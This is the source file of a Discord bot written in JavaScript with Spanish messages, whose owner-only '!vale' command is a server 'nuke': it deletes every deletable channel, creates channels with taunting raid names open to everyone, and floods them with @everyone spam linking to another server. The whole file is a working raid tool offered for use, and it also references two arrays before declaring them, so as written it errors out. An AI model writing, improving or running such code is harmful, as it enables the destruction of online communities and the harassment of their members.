require('dotenv').config();

const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';
const OWNER_IDS = ["1436516806842912970"];

client.once('ready', () => {
  console.log(`Bot conectado como ${client.user.tag}`);
  console.log('Prefijo: ' + PREFIX);
  console.log('Comando !vale disponible solo para owners');
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'vale') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('No tienes permiso para este comando tan heavy.');
    }

    try {
      await message.reply(
        `**¡NUKE PERSONALIZADO INICIANDO EN 5 SEGUNDOS!**\n\n` +
        `→ Creando **${nombresDeCanales.length}** canales\n` +
        `→ Enviando **${mensajesEnRafaga.length}** mensajes por canal\n\n` +
        `¡Ctrl + C para cancelar!`
      );

      await new Promise(r => setTimeout(r, 5000));

      const guild = message.guild;

      let borrados = 0;
      for (const ch of guild.channels.cache.values()) {
        if (ch.deletable && ch.id !== message.channel.id) {
          try {
            await ch.delete('Nuke by !vale');
            borrados++;
            await new Promise(r => setTimeout(r, 300));
          } catch {}
        }
      }
      await message.channel.send(`→ Borrados **${borrados}** canales.`);

      const nombresDeCanales = [
        "raid-for-$pwm$-jajaja",
        "raid-for-$pwm$-jajaja",
        "raid-for-$pwm$-jajaja",
        "raid-for-$pwm$-jajaja",
        "you-are-idiot-owned-by-vale",
        "you-are-idiot-owned-by-vale",
      ];

      const mensajesEnRafaga = [
        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
        "@everyone raid for $pwm$ JAJAJAJA you are idiot",
        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
        "@everyone entra si quieres recuperar llorar JAJAJA: https://discord.gg/fNmMktGJ",
      ];

      const nuevosCanales = [];
      for (const nombreOriginal of nombresDeCanales) {
        try {
          let nombre = nombreOriginal.toLowerCase()
            .replace(/[^a-z0-9- ]/g, '-')
            .replace(/\s+/g, '-')
            .replace(/-+/g, '-')
            .replace(/^-|-$/g, '')
            .slice(0, 100) || 'raid-default';

          const canal = await guild.channels.create({
            name: nombre,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
            ]
          });

          nuevosCanales.push(canal);
          console.log(`Creado → #${canal.name}`);
          await new Promise(r => setTimeout(r, 900));
        } catch (err) {
          console.log(`Fallo creando "${nombreOriginal}": ${err.message}`);
        }
      }
      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);

      let spameados = 0;
      for (const canal of nuevosCanales) {
        try {
          for (const msg of mensajesEnRafaga) {
            await canal.send(msg);
            console.log(`Enviado a #${canal.name}`);
            await new Promise(r => setTimeout(r, 1300));
          }
          spameados++;
        } catch (err) {
          console.log(`Problema en #${canal.name}: ${err.message}`);
        }
      }

      await message.channel.send(`**¡TERMINADO!** 😈\nCanales spameados: **${spameados}**`);

    } catch (err) {
      console.error('Error en !vale:', err);
      await message.channel.send('Error grave. Revisa logs.').catch(() => {});
    }
  }

  if (command === 'help') {
    return message.reply('Comandos:\n!vale → nuke personalizado (solo owners)\n!help → este mensaje');
  }
});

client.login(process.env.TOKEN).catch(err => {
  console.error('Error al conectar:', err.message || err);
});